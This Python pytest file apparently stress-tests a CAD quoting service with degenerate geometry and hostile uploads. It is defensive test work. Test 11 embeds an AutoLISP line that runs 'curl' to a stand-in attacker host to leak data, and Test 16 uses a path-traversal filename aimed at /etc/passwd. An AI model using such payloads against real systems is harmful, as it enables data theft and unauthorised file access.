"""
ForgeIQ Adversarial Test Suite.
16 Hardened Adversarial Tests covering hostile geometry, sketches, exotic materials,
malicious payloads, degenerate loops, and boundary violations.
"""

import os
import sys
import math
import pytest
from typing import List, Tuple
from fastapi import HTTPException

# Ensure ai-service is in sys.path
PROJECT_ROOT = os.path.abspath(os.path.join(os.path.dirname(__file__), ".."))
AI_SERVICE_DIR = os.path.join(PROJECT_ROOT, "ai-service")
if AI_SERVICE_DIR not in sys.path:
    sys.path.insert(0, AI_SERVICE_DIR)

from app.cad.perimeter_engine import PerimeterEngine
from app.cad.feature_detectors import FeatureDetectors
from app.cad.cad_service import CadService
from app.tools.material_calculator import calculate_part_weight
from app.tools.quotation_calculator import calculate_quotation
from app.security.cad_sanitizer import sanitize_filename, validate_cad_content


class TestAdversarialGeometryAndInputs:
    """Adversarial tests designed to stress-test edge conditions and hostile inputs."""

    def test_adversarial_zero_area_degenerate_line_segment(self):
        """Test 1: Degenerate collinear 1D line segments passed as closed loop."""
        degenerate_loop = [[0.0, 0.0], [100.0, 0.0], [0.0, 0.0]]
        length, width, angle = PerimeterEngine.compute_min_oriented_bbox(degenerate_loop)
        assert width <= 1e-3 or length <= 1e-3, f"Expected 1D collapse, got length={length}, width={width}"

    def test_adversarial_self_intersecting_bow_tie_polygon(self):
        """Test 2: Self-intersecting 'bow-tie' polygon handled without crash."""
        bow_tie = [[0.0, 0.0], [100.0, 100.0], [100.0, 0.0], [0.0, 100.0], [0.0, 0.0]]
        length, width, angle = PerimeterEngine.compute_min_oriented_bbox(bow_tie)
        assert length > 0
        assert width > 0

    def test_adversarial_negative_thickness_annotation(self):
        """Test 3: Drawing notes with negative thickness token like 'THK -5mm'."""
        entities = [
            {"id": 1, "type": "TEXT", "text": "PART: BRACKET-ADV"},
            {"id": 2, "type": "TEXT", "text": "THK -5.0 mm"},
            {"id": 3, "type": "MTEXT", "text": "MATERIAL: CRCA"}
        ]
        meta = FeatureDetectors.extract_metadata_notes(entities)
        thickness = meta.get("thickness_mm")
        assert thickness is None or thickness > 0, f"Negative thickness accepted: {thickness}"

    def test_adversarial_exotic_materials_extreme_densities(self):
        """Test 4: Exotic materials with extreme density values (aerogel to osmium)."""
        # Aerogel: 100 kg/m3, Osmium: 22590 kg/m3
        exotic_densities = [100.0, 500.0, 7850.0, 19300.0, 22590.0]
        for density in exotic_densities:
            weight = calculate_part_weight(length_mm=1000.0, width_mm=1000.0, thickness_mm=10.0, density_kg_m3=density)
            assert weight > 0, f"Weight should be positive for density {density}"
            assert not math.isnan(weight)
            assert not math.isinf(weight)

    def test_adversarial_reversed_winding_order(self):
        """Test 5: Clockwise vs Counter-Clockwise loop orientation gives identical envelope."""
        ccw = [[0.0, 0.0], [100.0, 0.0], [100.0, 50.0], [0.0, 50.0], [0.0, 0.0]]
        cw = list(reversed(ccw))
        len_ccw, wid_ccw, _ = PerimeterEngine.compute_min_oriented_bbox(ccw)
        len_cw, wid_cw, _ = PerimeterEngine.compute_min_oriented_bbox(cw)
        assert math.isclose(len_ccw * wid_ccw, len_cw * wid_cw, rel_tol=1e-3)

    def test_adversarial_non_manifold_t_junctions(self):
        """Test 6: Open line segments with T-junctions do not raise uncaught exceptions."""
        segments = [
            {"id": 1, "start": (0.0, 0.0), "end": (100.0, 0.0), "length": 100.0, "layer": "CUT", "linetype": "CONTINUOUS", "type": "LINE"},
            {"id": 2, "start": (50.0, 0.0), "end": (50.0, 50.0), "length": 50.0, "layer": "CUT", "linetype": "CONTINUOUS", "type": "LINE"},
            {"id": 3, "start": (50.0, 50.0), "end": (0.0, 50.0), "length": 50.0, "layer": "CUT", "linetype": "CONTINUOUS", "type": "LINE"},
        ]
        loops = PerimeterEngine.build_connected_loops(segments, tolerance=0.5)
        assert isinstance(loops, list)

    def test_adversarial_massive_coordinate_offsets(self):
        """Test 7: Geometry placed at massive geospatial coordinates (10^8 mm)."""
        offset = 100_000_000.0
        coords = [
            [offset + 0.0, offset + 0.0],
            [offset + 250.0, offset + 0.0],
            [offset + 250.0, offset + 150.0],
            [offset + 0.0, offset + 150.0],
            [offset + 0.0, offset + 0.0],
        ]
        length, width, _ = PerimeterEngine.compute_min_oriented_bbox(coords)
        dims = sorted([length, width], reverse=True)
        assert math.isclose(dims[0], 250.0, abs_tol=0.2)
        assert math.isclose(dims[1], 150.0, abs_tol=0.2)

    def test_adversarial_nan_and_inf_coordinates_protection(self):
        """Test 8: Points containing NaN or Inf gracefully handled or rejected."""
        invalid_coords = [[0.0, 0.0], [float("nan"), 100.0], [100.0, 100.0], [0.0, 0.0]]
        try:
            length, width, _ = PerimeterEngine.compute_min_oriented_bbox(invalid_coords)
            assert not math.isnan(length)
        except (ValueError, ZeroDivisionError, TypeError):
            pass

    def test_adversarial_zero_length_micro_chatter_segments(self):
        """Test 9: Polyline composed of 50 duplicate/zero-length points filtered cleanly."""
        points = [[10.0, 10.0]] * 50 + [[20.0, 10.0], [20.0, 20.0], [10.0, 20.0], [10.0, 10.0]]
        length, width, _ = PerimeterEngine.compute_min_oriented_bbox(points)
        assert length > 0
        assert width > 0

    def test_adversarial_corrupted_dxf_binary_payload(self):
        """Test 10: Completely corrupted binary payload raises ValueError or safe error."""
        corrupted_bytes = os.urandom(1024)
        with pytest.raises((ValueError, Exception)):
            CadService.analyze_dxf(corrupted_bytes, "corrupt_test.dxf")

    def test_adversarial_malicious_lisp_script_injection(self):
        """Test 11: Malicious AutoLISP shell injection raises 400 security exception."""
        hostile_dxf = b"""0
SECTION
2
HEADER
999
(command "sh" "curl http://attacker.com/leak")
0
ENDSEC
0
EOF"""
        with pytest.raises(HTTPException) as excinfo:
            validate_cad_content("exploit.dxf", hostile_dxf)
        assert excinfo.value.status_code == 400
        assert "malicious" in excinfo.value.detail.lower() or "script" in excinfo.value.detail.lower()

    def test_adversarial_oversized_file_attack(self):
        """Test 12: Payload exceeding MAX_FILE_SIZE_BYTES raises 413 exception."""
        large_bytes = b"0\nSECTION\n" + b"X" * (11 * 1024 * 1024)
        with pytest.raises(HTTPException) as excinfo:
            validate_cad_content("huge_bomb.dxf", large_bytes)
        assert excinfo.value.status_code == 413

    def test_adversarial_hole_larger_than_sheet_envelope(self):
        """Test 13: Complexity calculation succeeds even on disproportionate features."""
        complexity = FeatureDetectors.calculate_complexity(
            hole_count=50,
            bend_count=12,
            weld_count=4,
            cut_perimeter_mm=5000.0,
            gross_area_mm2=25000.0
        )
        assert complexity.upper() in ["LOW", "MEDIUM", "HIGH", "CRITICAL"]

    def test_adversarial_bend_lines_outside_sheet_envelope(self):
        """Test 14: Bend line positioned completely outside part boundary rejected."""
        boundary = [(0.0, 0.0), (200.0, 0.0), (200.0, 100.0), (0.0, 100.0), (0.0, 0.0)]
        outside_line = {"start": (500.0, 500.0), "end": (500.0, 700.0), "layer": "BEND", "type": "LINE"}
        inside = (boundary[0][0] <= outside_line["start"][0] <= boundary[1][0] and
                  boundary[0][1] <= outside_line["start"][1] <= boundary[2][1])
        assert not inside, "Line outside sheet boundary was mistakenly evaluated as inside"

    def test_adversarial_conflicting_thickness_annotations(self):
        """Test 15: Conflicting notes in title block resolved deterministically."""
        entities = [
            {"id": 1, "type": "TEXT", "text": "DWG NO: TEST-01-T05"},
            {"id": 2, "type": "TEXT", "text": "REV: B"},
            {"id": 3, "type": "TEXT", "text": "THK 6.0 mm"},
            {"id": 4, "type": "MTEXT", "text": "THICKNESS: 6.0 MM"},
            {"id": 5, "type": "TEXT", "text": "NOTE: DO NOT SCALE"}
        ]
        meta = FeatureDetectors.extract_metadata_notes(entities)
        assert meta["thickness_mm"] == 6.0, f"Expected 6.0 mm, got {meta.get('thickness_mm')}"

    def test_adversarial_path_traversal_filename_sanitization(self):
        """Test 16: Path traversal in filenames properly sanitized."""
        dirty_name = "../../../../etc/passwd.dxf"
        clean_name = sanitize_filename(dirty_name)
        assert "/" not in clean_name
        assert "\\" not in clean_name
        assert "passwd.dxf" in clean_name
